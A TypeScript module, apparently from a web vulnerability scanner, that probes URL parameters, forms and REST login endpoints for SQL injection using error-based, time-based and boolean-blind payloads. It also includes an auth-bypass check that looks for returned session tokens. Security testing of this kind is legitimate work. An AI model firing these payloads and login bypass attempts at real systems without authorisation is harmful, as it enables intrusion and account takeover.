import { buildPayloadTarget, PayloadFormat, SQL_ERROR_PATTERNS_ACTIVE, SQLI_PAYLOADS } from "../payloads";
import { AuthSession, CONFIDENCE, EMPTY_SESSION, FETCH_HEADERS, FormTarget, PendingFinding, safeUrlJoin } from "../types";
import { authedFetch, safeFetch } from "../session";
import { confirmSQLiHit } from "../verify";

export async function probeSQLiError(paramUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params) {
      const origVal = u.searchParams.get(param) ?? "";
      for (const payload of SQLI_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, origVal + payload);
          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
          if (!resp) continue;
          const body = await resp.text();
          const hit = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(body));
          if (!hit) continue;
          const confirmed = await confirmSQLiHit(paramUrl, param, payload, false, undefined, undefined, session);
          if (!confirmed) continue;
          return {
            type: "sql-injection-reflected",
            severity: "CRITICAL",
            url: testUrl.toString(),
            parameter: param,
            evidence: `SQL Injection confirmed (dual-payload verified) via URL parameter "${param}". Payload "${payload}" triggered a database error, confirmed with a second structurally different payload.`,
            cvssScore: 9.8,
            cveId: "CWE-89",
          };
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeFormSQLi(form: FormTarget, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  if (form.fields.length === 0) return null;

  for (const field of form.fields) {
    for (const payload of SQLI_PAYLOADS) {
      try {
        const formData = new URLSearchParams();
        for (const f of form.fields) formData.set(f, f === field ? payload : "test");

        let resp: Response | null = null;
        if (form.method === "POST") {
          resp = await authedFetch(form.actionUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString(),
            redirect: "follow",
          }, 8000, false, session);
        } else {
          const getUrl = new URL(form.actionUrl);
          for (const [k, v] of formData) getUrl.searchParams.set(k, v);
          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
        }

        if (!resp) continue;
        const body = await resp.text();
        if (!SQL_ERROR_PATTERNS_ACTIVE.some((p) => p.test(body))) continue;

        const confirmed = await confirmSQLiHit(form.actionUrl, field, payload, true, form.fields, form.method, session);
        if (!confirmed) continue;

        return {
          type: "sql-injection-form",
          severity: "CRITICAL",
          url: form.actionUrl,
          parameter: field,
          evidence: `SQL Injection confirmed (dual-payload verified) via form field "${field}" (${form.method} to ${form.actionUrl}). Database error triggered and confirmed with a second payload.`,
          cvssScore: 9.8,
          cveId: "CWE-89",
        };
      } catch { /* next */ }
    }
  }
  return null;
}

export async function probeRestApiSQLi(baseUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  const REST_LOGIN_PATHS = [
    "/rest/user/login", "/api/auth/login", "/api/login",
    "/api/v1/auth/login", "/api/v1/login", "/auth/login",
    "/login", "/api/user/login", "/api/authenticate",
    "/api/auth", "/api/users/login", "/api/sessions",
    "/api/token", "/api/signin",
  ];

  const buildBodies = (payload: string) => [
    { email: payload, password: "test" },
    { username: payload, password: "test" },
    { user: payload, pass: "test" },
    { login: payload, password: "test" },
  ];

  for (const path of REST_LOGIN_PATHS) {
    let endpointUrl: string;
    try { endpointUrl = new URL(path, baseUrl).toString(); } catch { continue; }

    const baseline = await authedFetch(endpointUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "test@test.com", password: "test" }),
    }, 8000, false, session);
    if (!baseline || [404, 502, 503].includes(baseline.status)) continue;

    for (const payload of SQLI_PAYLOADS) {
      for (const body of buildBodies(payload)) {
        try {
          const resp = await authedFetch(endpointUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json", Accept: "application/json" },
            body: JSON.stringify(body),
          }, 8000, false, session);
          if (!resp) continue;
          const text = await resp.text();

          const hitPattern = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(text));
          if (hitPattern) {
            const confirmPayload = SQLI_PAYLOADS.find(p => p !== payload) ?? "'--";
            const confirmBody = buildBodies(confirmPayload)[0];
            const confirmResp = await authedFetch(endpointUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(confirmBody),
            }, 8000, false, session);
            const confirmText = confirmResp ? await confirmResp.text() : "";
            if (!SQL_ERROR_PATTERNS_ACTIVE.some(p => p.test(confirmText))) continue;

            const emailField = Object.keys(body)[0];
            return {
              type: "sql-injection-reflected",
              severity: "CRITICAL",
              url: endpointUrl,
              parameter: emailField,
              evidence: `SQL Injection confirmed (dual-payload verified) via JSON REST API. Payload "${payload}" in field "${emailField}" triggered DB error, confirmed by a second payload.`,
              cvssScore: 9.8,
              cveId: "CWE-89",
              confidence: CONFIDENCE.DUAL_VERIFIED,
              validationSteps: [`Payload "${payload}" triggered SQL error pattern`, "Second payload confirmed with independent DB error"],
              isVerified: true,
            };
          }

          if (resp.status === 200 &&
            (payload.includes("OR") || payload.includes("1=1") || payload.includes("--"))) {
            let hasRealToken = false;
            try {
              const authJson = JSON.parse(text);
              const tokenVal = authJson?.token || authJson?.data?.token ||
                authJson?.authentication?.token || authJson?.access_token ||
                authJson?.accessToken || authJson?.jwt || "";
              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
            } catch {
              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
            }
            if (hasRealToken && !text.includes("test@test.com")) {
              const emailField = Object.keys(body)[0];
              return {
                type: "sql-injection-reflected",
                severity: "CRITICAL",
                url: endpointUrl,
                parameter: emailField,
                evidence: `SQL Injection (Auth Bypass) confirmed via JSON REST API. Payload "${payload}" returned HTTP 200 with a real session token — SQL WHERE clause bypassed.`,
                cvssScore: 9.8,
                cveId: "CWE-89",
                confidence: CONFIDENCE.DUAL_VERIFIED,
                validationSteps: [`Payload "${payload}" bypassed auth (HTTP 200 + real JWT token)`, "JWT token validated: length ≥ 20 chars, matches JWT pattern"],
                isVerified: true,
              };
            }
          }
        } catch { /* next */ }
      }
    }
  }
  return null;
}

const TIMING_SQLI = [
  { payload: "' AND SLEEP(4)--", db: "MySQL" },
  { payload: "'; SELECT SLEEP(4)--", db: "MySQL" },
  { payload: "' AND pg_sleep(4)--", db: "PostgreSQL" },
  { payload: "'; SELECT pg_sleep(4)--", db: "PostgreSQL" },
  { payload: "'; WAITFOR DELAY '0:0:4'--", db: "MSSQL" },
  { payload: "' OR SLEEP(4)--", db: "MySQL" },
  { payload: "1; SELECT SLEEP(4)--", db: "MySQL" },
];

export async function probeBlindSQLiTiming(paramUrl: string): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    const baselineStart = Date.now();
    const baselineResp = await safeFetch(u.toString(), 8000);
    const baselineTime = Date.now() - baselineStart;
    if (!baselineResp) return null;

    for (const param of params.slice(0, 2)) {
      const origVal = u.searchParams.get(param) ?? "";
      for (const { payload, db } of TIMING_SQLI) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, origVal + payload);
          const start = Date.now();
          const resp = await fetch(testUrl.toString(), {
            headers: FETCH_HEADERS,
            signal: AbortSignal.timeout(10000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);
          const elapsed = Date.now() - start;
          if (resp && elapsed > baselineTime + 3500) {
            let hitCount = 1;
            for (let i = 0; i < 2; i++) {
              const start2 = Date.now();
              await fetch(testUrl.toString(), {
                headers: FETCH_HEADERS,
                signal: AbortSignal.timeout(10000),
                // @ts-ignore
                next: { revalidate: 0 },
              }).catch(() => null);
              if ((Date.now() - start2) > baselineTime + 3500) hitCount++;
            }

            if (hitCount >= 2) {
              return {
                type: "sql-injection-blind-timing",
                severity: "CRITICAL",
                url: testUrl.toString(),
                parameter: param,
                evidence: `Blind Time-Based SQL Injection confirmed via ${db} SLEEP payload. The request with payload "${payload}" in parameter "${param}" took >3.5s longer than baseline on multiple attempts.`,
                cvssScore: 9.8,
                cveId: "CWE-89",
                confidence: CONFIDENCE.TIMING_VERIFIED,
                validationSteps: [`Baseline response time: ${baselineTime}ms`, `Payload "${payload}" triggered ${elapsed}ms delay (>${baselineTime + 3500}ms threshold)`, `Timing confirmed on ${hitCount}/3 additional measurements`],
                isVerified: true,
              };
            }
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeBlindSQLiBooleanDiff(paramUrl: string): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    const baselineResp = await safeFetch(u.toString(), 8000);
    if (!baselineResp || baselineResp.status >= 500) return null;
    const baselineBody = await baselineResp.text();
    const baselineLen = baselineBody.length;

    for (const param of params.slice(0, 3)) {
      const origVal = u.searchParams.get(param) ?? "";

      const truePairs = [
        { truePayload: "' OR '1'='1'--", falsePayload: "' OR '1'='2'--" },
        { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
        { truePayload: "1 OR 1=1", falsePayload: "1 OR 1=2" },
      ];

      for (const { truePayload, falsePayload } of truePairs) {
        try {
          const trueUrl = new URL(u.toString());
          trueUrl.searchParams.set(param, origVal + truePayload);
          const trueResp = await safeFetch(trueUrl.toString(), 8000);
          if (!trueResp) continue;
          const trueBody = await trueResp.text();
          const trueLen = trueBody.length;

          const falseUrl = new URL(u.toString());
          falseUrl.searchParams.set(param, origVal + falsePayload);
          const falseResp = await safeFetch(falseUrl.toString(), 8000);
          if (!falseResp) continue;
          const falseBody = await falseResp.text();
          const falseLen = falseBody.length;

          const lenDelta = Math.abs(trueLen - falseLen);
          const avgLen = (trueLen + falseLen) / 2 || 1;
          const percentDiff = (lenDelta / avgLen) * 100;

          const trueBaselineDelta = Math.abs(trueLen - baselineLen);
          const trueBaselinePercent = (trueBaselineDelta / (baselineLen || 1)) * 100;

          if (percentDiff > 10 && trueBaselinePercent < 20 && lenDelta > 50) {
            const verify = truePairs.find((p) => p.truePayload !== truePayload);
            if (verify) {
              const vTrueUrl = new URL(u.toString());
              vTrueUrl.searchParams.set(param, origVal + verify.truePayload);
              const vFalseUrl = new URL(u.toString());
              vFalseUrl.searchParams.set(param, origVal + verify.falsePayload);
              const vTrue = await safeFetch(vTrueUrl.toString(), 8000);
              const vFalse = await safeFetch(vFalseUrl.toString(), 8000);
              if (!vTrue || !vFalse) continue;
              const vTrueLen = (await vTrue.text()).length;
              const vFalseLen = (await vFalse.text()).length;
              if (Math.abs(vTrueLen - vFalseLen) < 30) continue;
            }

            return {
              type: "sql-injection-boolean-blind",
              severity: "HIGH",
              url: paramUrl,
              parameter: param,
              evidence: `Boolean-Blind SQL Injection confirmed via response diffing on parameter "${param}". True condition ("${truePayload}") returned baseline response (${trueLen} chars), while false condition ("${falsePayload}") changed response structure (${falseLen} chars, ${percentDiff.toFixed(1)}% diff).`,
              cvssScore: 8.6,
              cveId: "CWE-89",
              confidence: CONFIDENCE.DUAL_VERIFIED,
              validationSteps: [
                `True payload "${truePayload}" response length: ${trueLen}`,
                `False payload "${falsePayload}" response length: ${falseLen}`,
                `Diff: ${percentDiff.toFixed(1)}% — secondary boolean pair verified`,
              ],
              isVerified: true,
            };
          }
        } catch { /* next pair */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

export async function probeSQLiMultiFormat(
  targetUrl: string,
  paramName: string,
  format: PayloadFormat = "URL_PARAM",
  fields: string[] = [paramName],
  authedFetchFn: (url: string, init?: RequestInit) => Promise<Response | null>
): Promise<PendingFinding | null> {
  for (const payload of SQLI_PAYLOADS) {
    try {
      const { fetchUrl, options } = buildPayloadTarget(targetUrl, format === "URL_PARAM" ? "GET" : "POST", paramName, payload, format, fields);
      const resp = await authedFetchFn(fetchUrl, options);
      if (!resp) continue;
      const text = await resp.text();

      if (SQL_ERROR_PATTERNS_ACTIVE.some((pat) => pat.test(text))) {
        const confirmPayload = payload.includes("UNION") ? "'--" : "' OR '1'='1";
        const confirm = buildPayloadTarget(targetUrl, format === "URL_PARAM" ? "GET" : "POST", paramName, confirmPayload, format, fields);
        const confirmResp = await authedFetchFn(confirm.fetchUrl, confirm.options);
        const confirmText = confirmResp ? await confirmResp.text() : "";
        const isConfirmed = SQL_ERROR_PATTERNS_ACTIVE.some((pat) => pat.test(confirmText));

        return {
          type: "sqli",
          severity: "CRITICAL",
          url: targetUrl,
          parameter: paramName,
          evidence: `Database SQL error triggered via ${format} payload '${payload}' on parameter '${paramName}'.`,
          cvssScore: 9.8,
          cveId: "CWE-89",
          confidence: isConfirmed ? 0.98 : 0.85,
          validationSteps: [
            `Sent primary payload '${payload}' via ${format} to parameter '${paramName}'`,
            isConfirmed ? `Confirmed SQL signature with secondary payload '${confirmPayload}'` : "Single payload matched database error signature",
          ],
          isVerified: isConfirmed,
        };
      }
    } catch {}
  }
  return null;
}

/**
 * Time-based blind SQL injection probe targeting REST API login/auth endpoints.
 * Unlike probeBlindSQLiTiming (which needs URL params), this targets JSON bodies.
 */
export async function probeBlindSQLiRestEndpoints(
  baseUrl: string,
  session: AuthSession = EMPTY_SESSION
): Promise<PendingFinding | null> {
  const REST_PATHS = [
    "/rest/user/login", "/api/auth/login", "/api/login",
    "/api/v1/auth/login", "/api/v1/login", "/auth/login",
    "/login", "/api/user/login", "/api/authenticate",
    "/api/token", "/api/signin",
  ];

  const TIMING_PAYLOADS = [
    { payload: "' AND SLEEP(5)--", db: "MySQL", delay: 4500 },
    { payload: "'; SELECT pg_sleep(5)--", db: "PostgreSQL", delay: 4500 },
    { payload: "'; WAITFOR DELAY '0:0:5'--", db: "MSSQL", delay: 4500 },
    { payload: "')) AND SLEEP(5)--", db: "MySQL (nested)", delay: 4500 },
    { payload: "' OR SLEEP(5)--", db: "MySQL (OR)", delay: 4500 },
  ];

  for (const path of REST_PATHS) {
    try {
      const url = new URL(path, baseUrl).toString();

      // Baseline: send a normal login to measure response time
      const baselineStart = Date.now();
      const baseline = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
        body: JSON.stringify({ email: "baseline@test.com", password: "baselinetest" }),
        signal: AbortSignal.timeout(8000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      const baselineTime = Date.now() - baselineStart;
      if (!baseline || baseline.status === 404 || baseline.status >= 502) continue;

      for (const { payload, db, delay } of TIMING_PAYLOADS) {
        try {
          const start = Date.now();
          const resp = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: JSON.stringify({ email: payload, password: "test" }),
            signal: AbortSignal.timeout(12000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);
          const elapsed = Date.now() - start;

          if (resp && elapsed >= delay && elapsed > baselineTime + 3000) {
            // Confirm with a second measurement
            const start2 = Date.now();
            await fetch(url, {
              method: "POST",
              headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
              body: JSON.stringify({ email: payload, password: "test" }),
              signal: AbortSignal.timeout(12000),
              // @ts-ignore
              next: { revalidate: 0 },
            }).catch(() => null);
            const elapsed2 = Date.now() - start2;

            if (elapsed2 > baselineTime + 3000) {
              return {
                type: "sql-injection-blind-timing-rest",
                severity: "CRITICAL",
                url,
                parameter: "email (JSON body)",
                evidence: `Blind Time-Based SQL Injection confirmed on REST endpoint ${url} via ${db} sleep payload. Email field injection "${payload}" caused ${elapsed}ms delay (baseline: ${baselineTime}ms), confirmed on second request (${elapsed2}ms).`,
                cvssScore: 9.8,
                cveId: "CWE-89",
                confidence: CONFIDENCE.TIMING_VERIFIED,
                validationSteps: [
                  `Baseline POST to ${url}: ${baselineTime}ms`,
                  `Payload "${payload}" triggered ${elapsed}ms delay`,
                  `Confirmed on second request: ${elapsed2}ms delay`,
                ],
                isVerified: true,
              };
            }
          }
        } catch { /* next payload */ }
      }
    } catch { /* next endpoint */ }
  }
  return null;
}
